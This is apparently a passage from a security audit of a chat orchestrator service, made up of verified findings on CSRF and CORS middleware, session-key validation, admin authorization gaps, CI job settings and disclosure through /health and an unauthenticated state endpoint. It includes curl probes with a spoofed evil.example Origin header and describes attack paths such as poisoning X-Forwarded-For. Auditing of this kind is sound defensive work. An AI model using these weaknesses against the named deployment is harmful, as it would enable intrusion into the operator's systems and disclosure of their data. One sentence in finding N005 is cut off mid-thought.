*Fix.* One line in the middleware: `if request.url.path.startswith('/v1'): return await call_next(request)` — bearer auth is not cookie auth, so CSRF does not apply. Then a /v1-scoped CORS policy with allow_origins=['*'], allow_credentials=False, allow_headers=['Authorization','Content-Type','Idempotency-Key'], expose_headers=['X-Request-Id','Retry-After']. The finding's last sentence is the part that must not be dropped: the /v1 router must REFUSE a ts_session cookie presented without a bearer key, or a browser session silently becomes an API credential.

*Fix risk.* Orchestrator container restart. The risk is doing the exemption without the cookie refusal — that would turn /v1 into a CSRF hole against every signed-in browser. Land both in the same change and test that a cookie-only POST /v1/* gets 401.

### F020 — BUILD BLOCKER — the generation registry is one-per-conversation-key and the second concurrent request cancels the first

**P2** · orchestrator-core · `orchestrator/app/main.py:1876` · verdict **ADJUSTED** · claimed P1 · blocks release

*Evidence.* `conv_key_outer = request.conversation_id or scoped_session` where `scoped_session = f"u{viewer}-{request.session_id}"` (main.py:1738-1739) and `session_id: str = "default"` (ChatRequest, main.py:638). The registry is `_live_generations[conv_key_outer] = gen` — one slot (main.py:1923). On a second request under the same key:

    previous = _live_generations.get(conv_key_outer)
    if previous is not None and not previous.done and previous.task is not None and previous.user_id == viewer:
        ...
        previous.replaced = True
        previous.task.cancel()

(main.py:1875-1899). The cancelled stream's followers receive `event: error` with `{"message": "This answer was replaced by a newer message.", "code": "replaced"}` (main.py:3434-3443, _REPLACED_SENTENCE at main.py:1219).

*Impact.* If the /v1 surface reuses the /chat machinery — which is the natural implementation, since that is where admission, the breaker, continuity and usage recording live — two concurrent API calls from the same key that omit a conversation id both hash to `u<id>-default`, and the second silently kills the first with an `error` frame. That is correct product behaviour for a chat composer ("the user's newest message wins") and catastrophic API behaviour. It also means `GET /chat/active` and `POST /chat/stop` address work by conversation key, not by job id, so they cannot be reused for /v1 job control as they stand.

*Verification.* Verbatim accurate. main.py:1738-1739 `scoped_session = f"u{viewer}-{request.session_id}"` / `conv_key_outer = request.conversation_id or scoped_session`; ChatRequest.session_id defaults to 'default' (main.py:648); main.py:1923 `_live_generations[conv_key_outer] = gen` — one slot; main.py:1876-1902 is the replacement block, guarded by `previous.user_id == viewer` (so it never cancels another account's work) and ending in `previous.task.cancel()`. The replaced follower gets `error`/`code: replaced` at main.py:3436-3444. /chat/active (main.py:3696) and /chat/stop (main.py:3681) do address work by conversation key, as claimed. Adjusted to P2 for the same reason as F019: this is correct product behaviour for the composer today, and a design constraint for a surface that does not exist yet.

*Exploitable today.* no, not as a defect — the cancel is same-user only and is the intended 'newest message wins'. It becomes a correctness catastrophe the instant /v1 reuses the /chat machinery, which is the natural implementation.

*Fix.* For /v1, key the registry by generation_id and skip the replacement branch entirely. Half of it exists: `_live_generation_for(generation_id)` is already used at main.py:1805 and main.py:3736 — add `_generations_by_id: dict[str, LiveGeneration]`, register /v1 generations only there, and gate the main.py:1876 block on the browser path. Per-key concurrency then becomes a quota decision (F018) rather than an implicit cancel.

*Fix risk.* Orchestrator container restart. Touching the replacement block risks regressing the composer's newest-message-wins behaviour and the sweep_caller 409 at main.py:1888-1895 — keep the browser path byte-identical and add the id-keyed index alongside it rather than replacing it. No model restart.

### F021 — The CSRF 403 is emitted outside CORSMiddleware, so browsers see an opaque CORS error instead of a readable 403

**P2** · orchestrator-core · `orchestrator/app/main.py:243` · verdict **CONFIRMED**

*Evidence.* Starlette's `add_middleware` does `self.user_middleware.insert(0, ...)` (read from starlette 0.52.1 in-container), so CORS added at main.py:225 ends up INNER and the `@app.middleware("http")` added at main.py:243 ends up OUTER. Proven live:

  $ curl -i -X POST -H 'Origin: https://evil.example' -d '{}' http://127.0.0.1:8080/__probe
  HTTP/1.1 403 Forbidden
  content-type: application/json
  (no access-control-allow-origin header)

  $ curl -i -X POST -H 'Origin: http://localhost:3000' -d '{}' http://127.0.0.1:8080/__probe
  HTTP/1.1 404 Not Found
  access-control-allow-credentials: true
  access-control-allow-origin: http://localhost:3000

*Impact.* The security decision is correct but unreadable: a legitimate client on a newly added origin that has not yet reached _TRUSTED_ORIGINS sees "CORS error" in the console with no status and no body, which sends the developer hunting the CORS config instead of the origin allowlist. This will bite hard during the /v1 rollout, when new first-party and customer origins are added.

*Verification.* Reproduced live, both halves. `POST /__probe` with `Origin: https://evil.example` → 403 with headers date/server/content-length/content-type and NO access-control-allow-origin. The same POST with `Origin: http://localhost:3000` → 404 WITH `access-control-allow-credentials: true`, `access-control-allow-origin: http://localhost:3000`, `vary: Origin`. That is exactly the ordering the finding predicts from Starlette's `user_middleware.insert(0, ...)`: CORS added first at main.py:225 ends up inner, the decorator-registered check added second at main.py:243 ends up outer.

*Exploitable today.* not a security issue at all — the decision is correct, only the diagnosability is poor. No attacker position involved.

*Fix.* Move the `@app.middleware('http')` block so it is registered BEFORE `app.add_middleware(CORSMiddleware, ...)`, which puts CORS outermost and lets it decorate the 403. Behaviour is otherwise identical.

*Fix risk.* Orchestrator container restart. Middleware reordering is easy to get backwards — verify with the two curls above after the change (expect 403 WITH access-control-allow-origin for a trusted origin's non-trusted sibling). No model restart.

### F022 — GET /chat/trace/{trace_id} returns sanitized exception text that can carry an internal hostname or upstream body

**P2** · orchestrator-core · `orchestrator/app/main.py:3522` · verdict **ADJUSTED**

*Evidence.* `@app.get("/chat/trace/{trace_id}")` returns `db.get_query_trace(trace_id, viewer)` verbatim (main.py:3522-3530). That query selects `error_type, error_message` from query_trace_events (db.py:6132-6140). `error_message` is written as `sanitize(str(error))` (core/tracing.py:~168), and `sanitize` only redacts values under credential-LIKE KEYS and truncates at 4000 chars (tracing.py:41-49) — it does not touch the text of a bare string. An httpx ConnectError against the main model stringifies with the target, e.g. `http://vllm:30000/v1`. Contrast main.py:1230-1234, where `_failure_sentence` explicitly refuses this for the SSE wire: "Never the exception's own text: that can carry an internal hostname or an upstream body".

*Impact.* The safe-sentence discipline that governs the SSE wire (ORCH-01) is not applied to the trace route, so the same internal detail reaches the client through a second door. Scope is limited: the route is 401-gated via `_require_viewer` (main.py:3524, main.py:3651-3657) and row-scoped to the owner by `WHERE trace_id = %s AND user_id = %s` (db.py:6127), so this is an authenticated owner-only disclosure, not cross-tenant.

*Verification.* Mechanically correct. main.py:3522-3530 returns db.get_query_trace(trace_id, viewer) verbatim; db.py:6132-6140 selects error_type and error_message into each event; core/tracing.py:161 and :221 write `error_message = sanitize(str(error))`; tracing.py:41-49 shows sanitize on a plain string only truncates at _MAX_TEXT=4000 — redaction applies to credential-like KEYS in dicts, never to the text of a bare string. The finding's own scoping caveat is right: main.py:3524 `_require_viewer` (401 at main.py:3657) and db.py:6127 `WHERE trace_id = %s AND user_id = %s` make this owner-only. I flag it lower in practice than P2 suggests because the canonical example it gives — the hostname `vllm` — is already handed to UNAUTHENTICATED callers by /health (F014, `"url":"http://vllm:9838/state"`), so this second door discloses nothing the first does not.

*Exploitable today.* only to the trace's own owner, who must be signed in and must own the generation. No cross-tenant path.

*Fix.* Project the row in the route: return error_type (a class name, already safe) plus the same `_failure_sentence(exc)` the SSE wire uses (main.py:1230-1234), and keep the raw text for an admin surface behind Cap.AUDIT_READ. Do not expose a trace equivalent on /v1 until this is done.

*Fix risk.* Orchestrator container restart. Stripping error_message will blind whatever debugging workflow currently reads it — check docs/ and scripts/ for /chat/trace consumers first. No model restart.

### F023 — No response carries a request id; the correlation id exists but never leaves via a header, and only conditionally via SSE

**P2** · orchestrator-core · `orchestrator/app/core/tracing.py:96` · verdict **CONFIRMED**

*Evidence.* `self.request_id = request_id or f"req_{uuid.uuid4().hex}"` (tracing.py:96). It reaches a client only inside SSE `meta` payloads: the leading meta at main.py:1945-1955, guarded by `if client_intent:` (i.e. only when the caller supplied an intent_id, main.py:1704), and the engine's final meta at main.py:2016. `grep -n 'headers\[' app/main.py app/sse.py` finds only Cache-Control and X-Accel-Buffering (main.py:1541-1544, 3517-3519, 3806-3809). No X-Request-Id is set on any response, and non-SSE routes (all 100+ of them) have no correlation id at all.

*Impact.* A developer who gets a 500, a 422 or a 403 has nothing to quote in a support request, and there is no way to join a client-side failure to `query_traces.request_id` in PostgreSQL. For a public API this is the single most-requested debugging affordance and it is absent on every non-streaming path.

*Verification.* core/tracing.py:96 `self.request_id = request_id or f"req_{uuid.uuid4().hex}"`. `grep -n 'request_id' app/main.py` returns exactly three hits — 1950, 2016, 2181 — all inside SSE meta payloads, and the 1950 one is inside `if client_intent:` (main.py:1944), which main.py:1673 sets only when the caller supplied an intent_id. No header is ever set: the only headers on any response are Cache-Control and X-Accel-Buffering (main.py:3517-3518, 3806-3808). I confirmed live — `curl -i http://127.0.0.1:8080/health` returns only date, server, content-length, content-type.

*Exploitable today.* not a vulnerability — it is a missing operability affordance. No attacker position.

*Fix.* A pure-ASGI middleware (not BaseHTTPMiddleware, which interferes with streaming) that accepts or mints X-Request-Id, stashes it on request.state, and sets it on every response including error responses; pass it into TraceRecorder(request_id=...) so header and SSE meta agree. Echo it in the /v1 error envelope body too. Fold it into the same middleware as F016 and F023 is nearly free.

*Fix risk.* Orchestrator container restart. Getting it wrong as a BaseHTTPMiddleware would buffer SSE and break every stream and the 15 s heartbeat invariant — it must be pure ASGI. No model restart.

### N005 — `session_id` is the only client-supplied identifier on ChatRequest with no validation — unbounded length, any characters, and it is concatenated into a process-global registry key and a durable DB column

**P2** · orchestrator-core · `orchestrator/app/main.py:648` · verdict **FOUND IN VERIFICATION**

*Evidence.* main.py:648 `session_id: str = "default"`. Every sibling identifier on the same model IS validated: main.py:702-707 `_valid_test_case_id` against `_TEST_CASE_ID_RE`, main.py:709-714 `_valid_intent_id` against `_INTENT_ID_RE`, and conversation_id against `_CONVERSATION_ID_RE` at main.py:1757. There is no `@field_validator("session_id")` anywhere in the file.

That unvalidated string is concatenated into `scoped_session = f"u{viewer}-{request.session_id}"` (main.py:1739), which becomes (a) the key of the process-global `_live_generations` dict at main.py:1923, and (b) the value written to `chat_requests.conversation_id`, declared at db.py:1577 as `conversation_id text NOT NULL` — no length limit and no foreign key, so an arbitrary-length value is accepted and persisted. The same unvalidated concatenation appears in /chat/stop at main.py:3681 (`key = body.conversation_id or f"u{viewer}-{body.session_id}"`, StopRequest.session_id at main.py:3598, also unvalidated).

*Impact.* Two consequences, both aimed at the developer platform rather than at today's browser. First, it defeats the only implicit per-account concurrency limit the system has: F020's replace-on-same-key means one account sending repeatedly to one key cancels itself, but a caller varying session_id mints unlimited distinct keys, so one API key can start unbounded concurrent generations that pile into admission's 10 slots and 400 waiting positions (F018 has no per-identity dimension to stop it). Second, it is unbounded writable state — a caller can persist megabyte-sized keys into chat_requests rows and into an in-process dict that is never garbage-collected by key, combined with F016's absent body limit.

It is also the enabling half of the missed finding above: the attacker's reach into the `u<n>

*Fix.* Add the validator that every sibling field already has — `@field_validator("session_id")` rejecting anything that is not `^[A-Za-z0-9_-]{1,64}$`, on both ChatRequest (main.py:648) and StopRequest (main.py:3598). Four lines each, mirroring main.py:709-714. Combine with fix (1) of the previous finding and the key becomes both unforgeable and bounded.
Fix risk: a client already sending a session_id outside that alphabet would start getting 422s — grep frontend/ and scripts/ for session_id before landing, and widen the alphabet rather than the length if anything legitimately uses dots or colons. Orchestrator container restart only; no model restart.

### F030 — The cross-site-write middleware is inert for all real browser traffic and has no Referer/Sec-Fetch-Site fallback; it will also 403 the planned public developer API

**P3** · authn-authz · `orchestrator/app/main.py:243` · verdict **ADJUSTED** · claimed P2 · blocks release

*Evidence.* main.py:243-253 — `if request.method not in ("GET","HEAD","OPTIONS"): origin = request.headers.get("origin"); if origin and origin not in _TRUSTED_ORIGINS: return JSONResponse(status_code=403, ...)`. The `origin and` conjunction means an absent Origin always passes. Every browser mutation reaches the orchestrator through the Next.js route handlers, and frontend/lib/proxy.ts:25-44 builds a fresh header dict carrying only cookie, content-type, x-forwarded-for, x-forwarded-proto and user-agent — Origin and Referer are never forwarded. The main.py:236-239 comment acknowledges this ("the Next.js proxy strips Origin (server-to-server), so proxied traffic passes untouched"). The Next.js handlers themselves perform no origin check of their own (frontend/app/api/auth/password/route.ts and siblings are bare proxyToOrchestrator calls; frontend/app/api/admin/[...path]/route.ts:101-117 likewise). So the sole real CSRF defense for cookie-authenticated mutations is `samesite="lax"`, hard-coded at sessions.py:199. Separately, main.py:233-234 still asserts "/chat and /reports* remain auth-free", which is false — main.py:1658-1659 401s anonymous /chat and main.py:1055/1077 require_user on /reports.

*Impact.* Today the risk is low because SameSite=Lax genuinely blocks cross-site POST/PUT/DELETE in current browsers — but the defense-in-depth layer the comment claims does not exist, there is no Referer or Sec-Fetch-Site fallback for a client that omits Origin, and nothing would catch a future regression that loosened SameSite or introduced a state-changing GET. BUILD-BLOCKING in the other direction: a third-party developer calling /v1/responses from browser JavaScript sends `Origin: https://theirapp.com`, which this middleware 403s before any API-key check runs, and CORSMiddleware's fixed allowlist (main.py:227) rejects the preflight as well. A public versioned API cannot work through these two middlewares as written.

*Verification.* Every factual claim checks out. main.py:243-253 is `if request.method not in ("GET","HEAD","OPTIONS"): origin = request.headers.get("origin"); if origin and origin not in _TRUSTED_ORIGINS: return JSONResponse(403, ...)` - an absent Origin passes by construction. frontend/lib/proxy.ts:25-44 builds `const headers: Record<string,string> = {}` and sets only cookie, content-type, x-forwarded-for, x-forwarded-proto and user-agent; there is no `origin` or `referer` key anywhere in the file, and the admin/artifacts proxies build their own header sets the same way (artifacts forwards only cookie, range, if-none-match, content-type). sessions.py:199 hard-codes samesite="lax". The stale comment is real: main.py:233-234 still says '/chat and /reports* remain auth-free' while main.py:1655-1659 raises 401 for an anonymous /chat and main.py:1054 and :1078 both take `Depends(require_user)`. I drop it to P3 because there is no exploit today, which the finding itself concedes: the cookie is SameSite=Lax and Secure (AUTH_COOKIE_SECURE=true in the live env, sessions.py:172-174), I found no state-changing GET, and a genuine cross-site POST direct to :8080 does carry an Origin and is refused. The forward-looking half is the real content.

*Exploitable today.* no. No attacker position produces a cross-site write: Lax blocks the cookie on cross-site POST/PUT/DELETE, and a request that does carry a foreign Origin is 403'd by this very middleware. The defect is the absence of a defence-in-depth layer the comment claims to provide, plus a comment that misdescribes the auth model.

*Fix.* Three small edits, none urgent. (a) Correct the comment at orchestrator/app/main.py:233-234. (b) Forward the browser's Origin in frontend/lib/proxy.ts:25-44 and make the middleware fail closed for cookie-authenticated mutations carrying neither Origin nor Sec-Fetch-Site: same-origin. (c) Before /v1 ships, exempt the /v1 prefix from both _TRUSTED_ORIGINS (main.py:240) and the fixed-origin CORSMiddleware (main.py:225-231), authenticate /v1 on the Authorization header only with an explicit refusal to fall back to ts_session, and answer CORS for it with allow_credentials=False.

*Fix risk.* (a) is a comment. (b) touches the request path for every mutation - get it wrong and every proxied POST 403s, so it wants the frontend and orchestrator deployed together and a smoke test on login/send/rename. (c) is new code on a surface that does not exist yet. Orchestrator (and for (b) frontend) container restart; no model restart, no production window.

### F031 — Production CORS allowlist still contains http://localhost:3000 and http://127.0.0.1:3000 with allow_credentials=True

**P3** · authn-authz · `orchestrator/app/main.py:227` · verdict **ADJUSTED** · claimed P2

*Evidence.* main.py:225-231 configures CORSMiddleware with `allow_origins=settings.cors_allow_origins, allow_credentials=True, allow_methods=["*"], allow_headers=["*"]`. config.py:1174-1180 parses CORS_ALLOW_ORIGINS with a development default of "http://localhost:3000,http://127.0.0.1:3000". The live production container carries `CORS_ALLOW_ORIGINS=https://ai.techsarasolutions.com,http://localhost:3000,http://127.0.0.1:3000` (docker inspect sf-local-ai-orchestrator-1 Config.Env) — the development origins were appended to, not replaced by, the public one. _TRUSTED_ORIGINS (main.py:240) inherits the same list, so those two origins are also accepted by the CSRF middleware.

*Impact.* Any page an employee loads that is served from http://localhost:3000 or http://127.0.0.1:3000 on their own machine — a locally running dev server, a malicious npm postinstall that binds :3000, a stale container — can make credentialed cross-origin reads and writes against the orchestrator at :8080 with the employee's live ts_session cookie, and passes the Origin allowlist too. On a developer workstation that is a realistic path, and this box is a developer workstation.

*Verification.* The configuration fact is exactly as stated. main.py:225-231 passes allow_origins=settings.cors_allow_origins with allow_credentials=True, allow_methods=["*"], allow_headers=["*"]; config.py:1174-1180 parses CORS_ALLOW_ORIGINS with the development default 'http://localhost:3000,http://127.0.0.1:3000'; the live container env is CORS_ALLOW_ORIGINS=https://ai.techsarasolutions.com,http://localhost:3000,http://127.0.0.1:3000, i.e. appended to rather than replaced; and main.py:240 sets _TRUSTED_ORIGINS from the same list. What the impact paragraph overstates is the path. CORS origins are exact including port, so the hostile page must be served from port 3000 specifically - and on this box port 3000 is the real frontend. The cookie constraint is tighter still: ts_session is SameSite=Lax and Secure, and 'localhost' and '127.0.0.1' are different sites, so a page on http://127.0.0.1:3000 cannot get a cookie set on localhost sent to http://localhost:8080 and vice versa. An attacker who already owns loopback port 3000 on the victim's machine is proxying the login anyway. So this is hygiene and a latent trap, not a live path.

*Exploitable today.* no, not without an attacker already controlling loopback TCP/3000 on the victim's own workstation while the victim holds a ts_session cookie scoped to that same host - at which point they have a strictly better position than the CORS entry gives them.

*Fix.* Set CORS_ALLOW_ORIGINS to the public origin alone in the production env file (the two localhost entries stay in .env.example and local overrides). Optionally decouple _TRUSTED_ORIGINS (main.py:240) from the CORS list so read policy and write policy can diverge.

*Fix risk.* Env-only; orchestrator container restart, no model restart, no production window. Breaks any local frontend currently pointed at the production orchestrator from a developer machine - give that its own named origin if it is actually in use.

### N007 — GET /admin/api/members/{user_id}/sessions has no outranks guard - an admin can list a super admin's live sessions, IPs and user agents

**P3** · authn-authz · `orchestrator/app/authn/admin_api.py:284` · verdict **FOUND IN VERIFICATION**

*Evidence.* admin_api.py:284-307: the route takes `principal: Principal = Depends(require_capability(Cap.SESSIONS_MANAGE))`, calls only `await _target_member(principal, user_id)`, and returns up to 50 rows of {id, created_at, last_seen_at, expires_at, revoked_at, user_agent, ip}. Cap.SESSIONS_MANAGE is in _ADMIN_CAPS (rbac.py:62). The sibling POST /members/{user_id}/sessions/revoke at admin_api.py:309-318 DOES carry the guard - `if user_id != principal.user_id and not outranks(principal.role, target["role"]): raise HTTPException(403, ...)` at :316 - so the read half of the same capability was simply missed. The first pass listed the six WORKSPACE_CONTENT_READ routes and stopped there.

*Impact.* An admin can enumerate a super admin's (or a peer admin's) active sessions and see the source address and browser string of each - a targeting aid for the account they are explicitly forbidden from managing, and a small privacy leak of where the owner works from. Read-only and not audited.

*Fix.* Add the same line the revoke route already has, after `target = await _target_member(...)` on admin_api.py:287: `if user_id != principal.user_id and not outranks(principal.role, target["role"]): raise HTTPException(status_code=404, detail="No such member.")`. Fold it into the same change as F029. Orchestrator container restart; no model restart, no production window.

### N009 — chat_requests shares one conversation_id namespace between owner-checked ids and synthetic per-user session keys, and cancel_parked_chat_requests is not user-scoped

**P3** · authn-authz · `orchestrator/app/db.py:5980` · verdict **FOUND IN VERIFICATION**

*Evidence.* db.py:5980-5997 cancel_parked_chat_requests runs `UPDATE chat_requests SET status='cancelled' ... WHERE conversation_id = %s AND status='queued' AND NOT (intent_id = ANY(%s))` - conversation_id only, no user_id in the WHERE clause. db.py:5795-5801 latest_chat_request selects on conversation_id alone too. The value passed is conv_key_outer (main.py:1915), which is `request.conversation_id or scoped_session` (main.py:1739) - so the same column holds both real conversation ids, which ARE ownership-checked at main.py:1748-1769, and synthetic `u{viewer}-{session_id}` keys, which are NOT checked against anything because that branch only runs when request.conversation_id is empty. Both id spaces draw from the same alphabet (_CONVERSATION_ID_RE at main.py:212 permits [A-Za-z0-9_-]{1,64}, which covers 'u7-default'). By contrast the two places that DO matter for safety are correctly scoped and I confirmed them: main.py:1876-1882 only cancels a previous generation when `previous.user_id == viewer`, and /chat/requests/{intent_id} (main.py:3711) and /chat/attach (main.py:3795) both compare row user_id to the viewer.

*Impact.* Not cross-user exploitable today, and I want to be precise about why: a caller can only mint keys under their own `u<their own id>-` prefix, so reaching a victim's row requires the victim to own a conversation whose id literally starts with the attacker's user id prefix - browser-minted ids are random, so this is a self-collision at worst (a user who names a conversation 'u<their id>-default' makes their UI chat and their bare-API sends cancel each other's queued rows). The reason to record it is forward-looking: a public /v1 surface is precisely the bare-session path, it will multiply the synthetic keys, and the DB helper that cancels work has no owner check to fall back on if the key derivation is ever changed or if a future route lets a client influence the prefix.

*Fix.* Add user_id to the predicate - change db.py:5980 to cancel_parked_chat_requests(conversation_id, user_id, *, keep) with `AND user_id = %s`, and pass viewer from main.py:1915; do the same for latest_chat_request at db.py:5795 (main.py:3811 already re-checks the returned row's user_id, so this is defence in depth). Better still, keep the two id spaces apart by prefixing synthetic keys with a character the conversation-id regex forbids. Code-only; orchestrator container restart, no model restart, no production window.

### F070 — The `launcher (3.11)` matrix leg reports success when it discovers zero tests

**P3** · cicd · `.github/workflows/pipeline.yml:218` · verdict **CONFIRMED** · claimed P2

*Evidence.* pipeline.yml:194 `python: ["3.11", "3.12"]` and pipeline.yml:218-220 `env -u TECHSARA_MODEL_CACHE PYTHONPATH=launcher python -m unittest discover -s launcher/tests`. Measured on this box against an empty tests directory: `python3.11 -m unittest discover -s tests` prints `Ran 0 tests in 0.000s` / `OK` and exits 0; `python3.12 -m unittest discover -s tests` prints `NO TESTS RAN` and exits 5. The exit-5-on-no-tests behaviour was only added in 3.12. By contrast the other three suites are safe: pytest exits 5 on no collection, and `npx vitest run` on an empty directory printed `No test files found, exiting with code 1` (verified).

*Impact.* Today the 3.12 leg masks it, so the aggregate `launcher` job still fails. The gate becomes vacuous the moment the matrix changes — dropping 3.12, or adding a new 3.11-only suite. Given the step's own comment (pipeline.yml:210-217) documents four historical runs where this job reported success while six tests failed, the same class of silence is worth closing rather than relying on a version accident. The developer-platform build will add launcher coverage for the new API service definitions, which makes the matrix likely to change.

*Verification.* Facts are exactly right and I reproduced them. pipeline.yml:194 sets python: ["3.11","3.12"] and :218-220 runs `env -u TECHSARA_MODEL_CACHE PYTHONPATH=launcher python -m unittest discover -s launcher/tests`. Against an empty tests directory: python3.11 => exit 0 ("OK"), python3.12 => exit 5 ("NO TESTS RAN"). The exit-5-on-no-collection behaviour is 3.12+. I downgrade to P3 because it is purely latent: the 3.12 leg currently fails, `needs.launcher.result` is the aggregate of the matrix, and ci_gate.py (:47-62) refuses anything that is not `success`, so the gate holds today.

*Exploitable today.* no. It becomes live only if the matrix changes — dropping 3.12, or adding a 3.11-only leg — which the developer-platform build makes plausible since it will add launcher coverage for new service definitions.

*Fix.* Run the launcher suite under pytest (`python -m pytest launcher/tests -q`), which fails on empty collection on every version and matches the other three suites. If unittest must stay, assert the count: tee the output and `grep -Eq '^Ran [0-9]{3,} tests'`.

*Fix risk.* Low, but not zero: pytest collects differently from unittest discover, so the suite must be run once locally to confirm the same tests are found. Workflow-only, no restart, no window.

### F072 — Eight of twelve jobs declare no `timeout-minutes` and inherit the 6-hour default

**P3** · cicd · `.github/workflows/pipeline.yml:106` · verdict **CONFIRMED** · claimed P2

*Evidence.* A YAML dump of every job shows `timeout-minutes` set only on `images` (45, pipeline.yml:547), `deploy` (45, :776), `verify` (15, :941) and `recovery` (10, :1034). `policy`, `launcher`, `orchestrator`, `sync-worker`, `frontend`, `schema`, `security` and `ci-ok` have none, so each gets GitHub's 360-minute default.

*Impact.* A hung service container health-check, a wedged `docker buildx`, a stuck `npm ci` or a Postgres that never becomes ready burns up to six hours of hosted-runner time per job before the run is killed, and the PR sits amber the whole time with no signal. The `orchestrator` job in particular holds a Postgres service container and a ~3,150-test suite; a deadlock there is the realistic case.

*Verification.* I dumped the parsed YAML rather than trusting a grep: only `images` (45), `deploy` (45), `verify` (15) and `recovery` (10) set timeout-minutes. `policy`, `launcher`, `orchestrator`, `sync-worker`, `frontend`, `schema`, `security` and `ci-ok` have none and inherit GitHub's 360-minute default. Note the three jobs that can touch production hardware are all already bounded, which is why I drop this to P3: the unbounded jobs are all hosted-runner test jobs, so the cost is runner minutes and a PR that sits amber, never a wedged production box.

*Exploitable today.* no. The realistic case is a hung Postgres service container in `orchestrator` or a stuck `npm ci`, costing up to six hours of hosted minutes with no signal.

*Fix.* Add timeout-minutes to the eight jobs (policy 10, launcher 10, sync-worker 10, frontend 20, schema 20, security 30, orchestrator 45, ci-ok 5). Adding it as a P7 in workflow_policy.py is the right call for the developer-platform build, so a new job cannot forget.

*Fix risk.* A timeout set below real p95 turns a slow-but-healthy run red; size from recent run durations, not from the proposal's numbers. Workflow-only.

### F073 — The recovery job publishes the full unauthenticated /health payload into a public repository's run summary

**P3** · cicd · `.github/workflows/pipeline.yml:1053` · verdict **CONFIRMED** · claimed P2

*Evidence.* pipeline.yml:1053-1056 writes `curl -fsS -m 15 http://127.0.0.1:8080/health 2>&1 | head -60` into `$GITHUB_STEP_SUMMARY`. The payload is a single line of 2052 bytes (`curl .../health | wc -c` => 2052), so `head -60` truncates nothing. It contains internal service URLs (`"url":"http://vllm:9838/state"`), the served model id, `"schema_version":33`, admission-control capacities and thresholds, serving flags (`kv_cache_dtype`, `max_num_batched_tokens`, `max_model_len`), the LanceDB directory path `/data/lancedb-web` with row and page counts, and free disk. Run summaries on a public repository are world-readable.

*Impact.* Internal architecture, capacity limits and schema state are published to anyone who opens a failed run — and a failed run is exactly when the most revealing state is captured. None of it is a credential, so this is disclosure rather than compromise, but it hands an attacker the map: which services exist, what the engine's admission limits are, and which schema version the database is on.

*Verification.* pipeline.yml:1053-1056 writes `curl -fsS -m 15 http://127.0.0.1:8080/health 2>&1 | head -60` into $GITHUB_STEP_SUMMARY. I fetched the live payload: 2052 bytes and ZERO newlines, so `head -60` truncates nothing. It carries the internal service URL "http://vllm:9838/state", breaker state and thresholds, admission capacities (normal 10 / long 1, long_threshold_tokens 131072), queue limits, "schema_version":33, configured/served_max_model_len 1000000, and the LanceDB paths. The repo is public (gh api => "visibility":"public"), so run summaries are world-readable. No credential is in the payload, which is why P3 rather than P2 — this is a map, not a key.

*Exploitable today.* yes in the disclosure sense, by any anonymous reader of a failed run — and the job only runs on a failed main deploy, i.e. exactly when the state is most revealing. It requires no attacker position at all.

*Fix.* Project the fields a human needs instead of dumping the document: `curl -fsS http://127.0.0.1:8080/health | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['status'], {k: v.get('status') for k,v in d['checks'].items()})"`. Keep the full payload in the job log or a short-retention artifact, not the summary.

*Fix risk.* None. Workflow-only; no restart, no window.

### N024 — pip-audit never scans the orchestrator's production dependency set

**P3** · cicd · `.github/workflows/pipeline.yml:490` · verdict **FOUND IN VERIFICATION**

*Evidence.* pipeline.yml:490 iterates exactly two files: `orchestrator/requirements-dev.txt` and `sync-worker/requirements.txt`. `orchestrator/requirements.txt` (74 lines, the set the production image installs) is never passed. I diffed them normalised: the pins are otherwise identical, but `transformers>=4.51` and `numpy>=1.26` are in the runtime file only (requirements-dev.txt:2-3 says so explicitly: "Identical to requirements.txt EXCEPT: no transformers"), so those two are audited nowhere.

*Impact.* Small today — two packages — but `transformers` is a recurring CVE source and it is a production-only dependency of the service that will host the public API. Combined with F071 (the step's outcome is always `success`), the Python half of the supply-chain table conveys nothing about the production tree at all.

*Fix.* Add `orchestrator/requirements.txt` to the loop at pipeline.yml:490 (and `sync-worker/requirements-dev.txt` for symmetry). Workflow-only; no restart.

### N025 — The engine controller binds 0.0.0.0 by default and serves /state unauthenticated on the LAN

**P3** · cicd · `monitoring/engine-controller/controller.py:356` · verdict **FOUND IN VERIFICATION**

*Evidence.* controller.py:290 `bind: str = "0.0.0.0"` and :356 `bind=env_str("CONTROLLER_BIND", "0.0.0.0")`; `ss -ltnp` shows LISTEN 0.0.0.0:9838 and `curl -s http://127.0.0.1:9838/state` returns the full recovery-authority state document (incident, readiness probes, cold-start detail, per-step recovery history). I checked the mutating side before claiming anything: controller.py:3210-3225 refuses `POST /recover` from any non-loopback peer ("POST /recover is accepted from 127.0.0.1 only"), and the worker-side sentinel additionally requires the head's address AND CLUSTER_SENTINEL_TOKEN (sentinel.py:403-421). So there is no LAN control-plane takeover — only unauthenticated read of the recovery control plane.

*Impact.* Disclosure of the same class as F073, but continuous and from the LAN rather than one-off in a public run summary: an observer learns incident state, recovery budget consumption and whether the engine is wedged. It is also the same blind spot as F065 — the deploy's verify stage probes 127.0.0.1:9838 (via the orchestrator /health payload) and cannot tell loopback from 0.0.0.0.

*Fix.* Set CONTROLLER_BIND to the loopback or the cluster address in the controller's service definition (Prometheus reaches it via host.docker.internal:9838, monitoring/prometheus/prometheus.yml:117, so check that path still resolves after the change) and change the default at controller.py:290/:356 to 127.0.0.1. Recreating the engine-controller container is cheap and does NOT restart the main model pair — but confirm that before doing it, since the controller holds the engine recovery lock.

### N026 — AUTH_TRUST_PROXY_HEADERS=true while the orchestrator port is LAN-reachable, so the audit trail's client IP is caller-supplied

**P3** · cicd · `orchestrator/app/authn/sessions.py:227` · verdict **FOUND IN VERIFICATION**

*Evidence.* client_meta (sessions.py:219-231) returns `request.headers.get("x-forwarded-for").split(",")[0]` as the IP for session rows and audit events whenever settings.auth_trust_proxy_headers is set. Production sets it: .env:324 `AUTH_TRUST_PROXY_HEADERS=true`, justified at .env:322-323 by "the sole path to the orchestrator is the frontend proxy ... the port is not otherwise reachable" — but `ss -ltnp` shows the orchestrator on 0.0.0.0:8080, so the premise is false on the LAN. I checked the blast radius and it is narrow: the only other use of the flag (sessions.py:183) is the AUTH_COOKIE_SECURE="auto" path, and production pins AUTH_COOKIE_SECURE=true (.env:321), so no cookie weakening. No authorization decision reads client IP (`grep -rn client_ip orchestrator/app` outside tests => no hits).

*Impact.* Today: a LAN caller can write an arbitrary IP into session rows and audit events, poisoning the forensic record — no auth bypass. It escalates the moment the developer platform lands: per-key rate limiting, abuse throttling, IP allowlists on API keys and key-usage analytics are all natural next features, and each would be keyed on a value the caller controls unless the trust boundary is fixed first.

